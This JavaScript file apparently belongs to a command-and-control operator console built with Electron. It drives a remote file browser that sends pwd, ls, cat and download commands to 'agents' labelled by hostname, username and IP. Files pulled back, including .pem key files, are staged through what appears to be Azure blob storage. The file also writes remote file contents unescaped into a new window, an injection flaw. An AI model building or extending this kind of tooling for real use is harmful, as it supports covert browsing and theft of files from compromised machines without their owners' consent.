const { ipcRenderer } = require("electron");
const crypto = require('crypto');
const az = require('./azure');
const { log } = require('console');
let sortAscending = true;
let containerName = '';
let containerKey;
let containerBlob;
let agentObj;
let agent;
let init_cwd = 0;
let pwd = '';
let mode = '';
let currentFile = '';
global.agent = null;


function splitStringWithQuotes(str) {
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
      const char = str[i];
      if (insideQuotes) {
        if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
          // Handle escaped quote or backslash
          current += str[i + 1];
          i++; // Skip the next character
        } else if (char === quoteChar) {
          // End of quoted string
          insideQuotes = false;
          result.push(current);
          current = '';
        } else {
          // Inside quoted string
          current += char;
        }
      } else {
        if (char === '"' || char === "'") {
          // Start of quoted string
          insideQuotes = true;
          quoteChar = char;
        } else if (char === '\\' && str[i + 1] === ' ') {
          // Handle escaped space
          current += ' ';
          i++; // Skip the next character
        } else if (char === ' ') {
          // Space outside of quotes
          if (current.length > 0) {
            result.push(current);
            current = '';
          }
        } else {
          // Unquoted string
          current += char;
        }
      }
    }
    // Add the last argument if there's any
    if (current.length > 0) {
      result.push(current);
    }
    return result;
}
function generateUUID(len) {
    // Generate a random UUID
    if (len > 20){len = 20};
    const uuid = crypto.randomUUID();
    // Remove hyphens and take the first 10 characters
    const shortUUID = uuid.replace(/-/g, '').substring(0, len);
    return shortUUID;
}
function doDownloadFile(argv) 
{
  const downloadFile = "'" + argv[1] +"'";
  const downloadBlob = generateUUID(10);
  const download = {
    'file':downloadFile,
    'blob':downloadBlob
  }
  return download;
}

class Task {
    constructor(command) {
        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
        this.command = command;
    }
}

function sendCommand(command) {
    let argv = splitStringWithQuotes(command);
    log(`[EXPLORER][SENDCMD] command : ${command}`);
    log(`[EXPLORER][SENDCMD] argv : ${argv}`);
    let download;
    const task = new Task(
        command
    );
    if (!Array.isArray(global.agent.tasks)) {
        global.agent.tasks = [];
    }
    global.agent.tasks.push(task);
    log(`[EXPLORER][SENDCMD] task : ${JSON.stringify(global.agent.tasks[global.agent.tasks.length - 1])}`);

    if (argv[0] == "download")
    {
        let currentPath = document.getElementById("dirPath").value.trim();
        const concatenated = argv.slice(1).join(" ");
        argv[1] = currentPath.endsWith("/") ? currentPath + concatenated : currentPath + "/" + concatenated;
        download = doDownloadFile(argv);
        global.agent.tasks[global.agent.tasks.length - 1].command = `download ${download['file']} ${download['blob']}`;
        ipcRenderer.send('pull-download-file', global.agent,download['file'],download['blob']);  // Send command and container name
        ipcRenderer.send('upload-client-command-to-input-channel', global.agent);  // Send command and container name
// 
    }
    else{
        log(`[EXPLORER][SENDCMD] hit all else handler`);
        ipcRenderer.send('upload-client-command-to-input-channel', global.agent);  // Send command and container name
    }
}

async function initialize() {
    log(`explorer.js : initialize `);
    mode = "pwd";
    await sendCommand("pwd");
}

async function listFiles() {
    mode = "list";
    sendCommand(`ls ${"'"+document.getElementById("dirPath").value.trim()+"'"}`);
}

async function format_ls_output(filesAndFolders) {
    let resultBuffer = '';
    resultBuffer += `Name`.padEnd(60) + `Type`.padEnd(16) + `Size (bytes)`.padEnd(15) + `Created`.padEnd(24) + `Modified`.padEnd(24) + '\n';
    resultBuffer += '-'.repeat(30) + '-'.repeat(10) + '-'.repeat(15) + '-'.repeat(30) + '-'.repeat(30) + '\n';
    log(`[AGENT][IPC] format_ls_output : ${filesAndFolders}`);
    let entries = JSON.parse(filesAndFolders)

    for (const entry of entries) {
        try {
            log(`[AGENT][IPC] entry : ${entry}`);
            const options = { 
                month: '2-digit', 
                day: '2-digit', 
                year: '2-digit', 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                hour12: false 
            };
            resultBuffer += (entry.name || '').padEnd(60);
            resultBuffer += (entry.type || '').padEnd(16);
            resultBuffer += (entry.stats.size ? String(entry.stats.size) : '').padEnd(15);
            resultBuffer += (entry.stats.ctimeMs ? new Date(entry.stats.ctimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
            resultBuffer += (entry.stats.mtimeMs ? new Date(entry.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
            resultBuffer += '\n';
        } catch (err) {
            log(`Error: ${err.message}`);
        }
    }
    return resultBuffer;
}

async function listFiles_display(lsCommandOutput) 
{
    try {
        // Parse the JSON string into an array of file entries
        let files = JSON.parse(lsCommandOutput);

        // Insert into table
        const fileList = document.getElementById("fileList");
        fileList.innerHTML = "";

        files.forEach(file => {
            const row = document.createElement("tr");
            const type = file.type === "Directory" ? "Folder" : "File";
            const size = file.stats.size || '-';
            
            const options = { 
                month: '2-digit', 
                day: '2-digit', 
                year: '2-digit', 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                hour12: false 
            };
            const modified = file.stats.mtimeMs ? new Date(file.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '';

            const nameCell = document.createElement('td');
            nameCell.className = type.toLowerCase();
            nameCell.textContent = file.name;
            nameCell.addEventListener('click', () => {
                if (type === 'Folder') navigateTo(file.name);
                else openFile(file.name);
            });

            const sizeCell = document.createElement('td');
            sizeCell.textContent = String(size);
            const typeCell = document.createElement('td');
            typeCell.textContent = type;
            const modifiedCell = document.createElement('td');
            modifiedCell.textContent = modified;
            row.append(nameCell, sizeCell, typeCell, modifiedCell);
            fileList.appendChild(row);
        });
    } catch (err) {
        log(`Error in listFiles_display: ${err.message}`);
    }
}

async function navigateTo(folderName) {
    let currentPath = document.getElementById("dirPath").value.trim();
    
    // Ensure the new path is correctly formatted
    let newPath = currentPath.endsWith("/") ? currentPath + folderName : currentPath + "/" + folderName;

    document.getElementById("dirPath").value = newPath;
    listFiles();
}

async function goBack() {
    let currentPath = document.getElementById("dirPath").value.trim();

    if (currentPath === "/") return; // Prevent navigating beyond root "/"

    // Remove trailing slash if it exists to avoid double counting
    if (currentPath.endsWith("/")) {
        currentPath = currentPath.slice(0, -1);
    }

    // Find the new last occurrence of "/"
    let lastSlashIndex = currentPath.lastIndexOf("/");

    // If there's a parent directory, update the path
    if (lastSlashIndex > 0) {
        let parentPath = currentPath.substring(0, lastSlashIndex + 1); // Keep trailing slash
        document.getElementById("dirPath").value = parentPath;
        listFiles();
    } else {
        document.getElementById("dirPath").value = "/"; // If no more parent, stay at root
        listFiles();
    }
}

async function openFile(filePath) {
    const textExtensions = [".txt", ".json", ".pem", ".log", ".xml", ".md", ".csv", ".ini", ".conf", ".yaml", ".yml",
        ".js",".bak",".html",".css",".cnf"
    ];
    
    // Extract file extension
    log(`openFile : ${filePath}`);
    let fileExt = filePath.substring(filePath.lastIndexOf(".")).toLowerCase();
    
    if (textExtensions.includes(fileExt)) {
        mode = 'cat';
        log(`Reading file: ${filePath}`);
        let currentPath = document.getElementById("dirPath").value.trim();
        let catFilePath = currentPath.endsWith("/") ? currentPath + filePath : currentPath + "/" + filePath;
        catFilePath = "'" + catFilePath + "'";
        currentFile = catFilePath;
        sendCommand(`cat ${catFilePath}`);
    } else {
        log(`Downloading file: ${filePath}`);
        sendCommand(`download ${filePath}`);
    }
}

function sortTable(columnIndex) {
    const table = document.querySelector("tbody");
    const rows = Array.from(table.querySelectorAll("tr"));

    rows.sort((a, b) => {
        let valA = a.children[columnIndex].innerText;
        let valB = b.children[columnIndex].innerText;

        if (!isNaN(valA) && !isNaN(valB)) {
            valA = parseFloat(valA);
            valB = parseFloat(valB);
        }

        return sortAscending ? (valA > valB ? 1 : -1) : (valA < valB ? 1 : -1);
    });

    sortAscending = !sortAscending;
    table.innerHTML = "";
    rows.forEach(row => table.appendChild(row));
}

document.getElementById("dirPath").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        listFiles();
    }
});

// document.addEventListener("keydown", function(event) {
//     if (event.key === "Backspace") goBack();
// });


ipcRenderer.on('command-output', (event, output) => {
    try {
        if (output) {
            // Convert output to string if it's an object
            log(`[EXPLORER][IPC][COMMANDOUT]: output : ${JSON.stringify(output)}`);
            
            // if(output.output === "pushedfile" || !output.output.substring(0, 3).includes('/')){
            //     const dirPath = document.getElementById('dirPath');
            //     if (!dirPath.value)
            //     {
            //         initialize();
            //         return;
            //     }else{
            //        // listFiles();
            //     }
            // }
            if (output.command === "pwd") {
                mode = "";
                output.output = output.output.trim();
                output.output = output.output.replace(/\\/g, '/');
                if (!output.output.endsWith("/")) {
                    output.output += "/";
                }
                document.getElementById("dirPath").value = output.output;
                log(`[EXPLORER][IPC][CMDOUT] output.output : ${output.output}`);
                pwd = output.output;
                listFiles();
            } 
            else if (mode === "list") {
                mode = "";
                listFiles_display(output.output);
            } 
            else if (mode === "cat") {
                mode = "";
                openTextFileInNewWindow(output.output);
            }
        }
    } catch (error) {
        log(`[EXPLORER][IPC][CMDOUT] error : ${error.message}\r\n${error.stack}`);
    }
});

function openTextFileInNewWindow(content) {
    // Count number of lines in the content
    const lineCount = content.split("\n").length;
    const lineHeight = 18; // Approximate height per line in pixels (adjust if needed)
    const minHeight = 200; // Minimum window height
    const maxHeight = window.screen.height - 100; // Prevent window from being too large
    let calculatedHeight = Math.min(Math.max(lineCount * lineHeight + 200, minHeight), maxHeight);

    // Open new window with adjusted height
    const textWindow = window.open("", "TextViewer", `width=1000,height=${calculatedHeight}`);

    if (currentFile.startsWith("'") && currentFile.endsWith("'")) {
        currentFile = currentFile.slice(1, -1);
    }

    textWindow.document.write(`
        <html>
        <head>
            <title>${currentFile}</title>
            <style>
                body { 
                    font-family: monospace; 
                    white-space: pre-wrap; 
                    margin: 0; 
                    padding: 0; 
                    background: #111; 
                    color: #f8f9f8; 
                    overflow: hidden; 
                }
                .container {
                    display: flex;
                    flex-direction: column;
                    height: 100vh;
                }
                .header {
                    padding: 2px;
                    background: #222;
                    color: #fff;
                    text-align: center;
                    font-size: 18px;
                    border-bottom: 1px solid #333;
                }
                .content {
                    flex: 1;
                    padding: 2px;
                    overflow: auto;
                }
                textarea { 
                    width: 100%; 
                    height: 100%; 
                    background: #222; 
                    color: #fff; 
                    border: none; 
                    padding: 2px; 
                    font-size: 14px; 
                    resize: none; 
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="content">
                    <textarea readonly>${content}</textarea>
                </div>
            </div>
        </body>
        </html>
    `);
}

window.addEventListener('DOMContentLoaded', async () => 
    {
      ipcRenderer.on('container-data', (event, agent_object) => 
      {
        log(`explorer.js : container-data : ${agent_object.agentid}`);
        try{
          global.agent = agent_object;
          document.title = `${agent_object.agentid.toUpperCase()} | ${agent_object.hostname.toUpperCase()} | ${agent_object.username.toUpperCase()} | ${agent_object.IP}`;
    
          const dirPath = document.getElementById('dirPath');
          dirPath.focus();
          dirPath.selectionStart = dirPath.selectionEnd = dirPath.value.length; // Ensure cursor is at the end of input
        }catch(error)
        {
          log(error);
        }
    });
    const checkVariables = setInterval(() => {
        if (global.agent) {
            log(`explorer.js : container-data : ${global.agent}`);
            clearInterval(checkVariables); // Stop the loop when all variables have values
            initialize();
        }
    }, 100); // Check every 100ms
    }
);

document.addEventListener("keydown", function(event) {
    const dirPath = document.getElementById("dirPath");

    if (!dirPath) return; // Ensure element exists

    const isCtrlOrMeta = event.ctrlKey || event.metaKey;
    const isAlt = event.altKey;

    if (isCtrlOrMeta) {
        switch (event.key.toLowerCase()) {
            case "c": // Copy
                event.preventDefault();
                dirPath.select();
                document.execCommand("copy");
                log("Copied to clipboard:", dirPath.value);
                break;

            case "a": // Select all
                event.preventDefault();
                dirPath.select();
                log("Selected all text in dirPath");
                break;

            case "v": // Paste
                event.preventDefault();
                navigator.clipboard.readText().then((clipboardText) => {
                    dirPath.value = clipboardText;
                    log("Pasted:", clipboardText);
                }).catch(err => console.error("Failed to read clipboard:", err));
                break;

            case "x": // Cut
                event.preventDefault();
                dirPath.select();
                document.execCommand("cut");
                log("Cut text from dirPath");
                break;

            case "arrowleft": // Move cursor back one word
                event.preventDefault();
                moveCursorByWord(dirPath, "left");
                log("Moved cursor back one word");
                break;

            case "arrowright": // Move cursor forward one word
                event.preventDefault();
                moveCursorByWord(dirPath, "right");
                log("Moved cursor forward one word");
                break;
        }
    }
});

// Function to move cursor by one word
function moveCursorByWord(input, direction) {
    let pos = input.selectionStart;
    let value = input.value;

    if (direction === "left") {
        while (pos > 0 && value[pos - 1] === " ") pos--; // Skip spaces
        while (pos > 0 && value[pos - 1] !== " ") pos--; // Move to start of the word
    } else if (direction === "right") {
        while (pos < value.length && value[pos] === " ") pos++; // Skip spaces
        while (pos < value.length && value[pos] !== " ") pos++; // Move to end of the word
    }

    input.selectionStart = input.selectionEnd = pos;
}
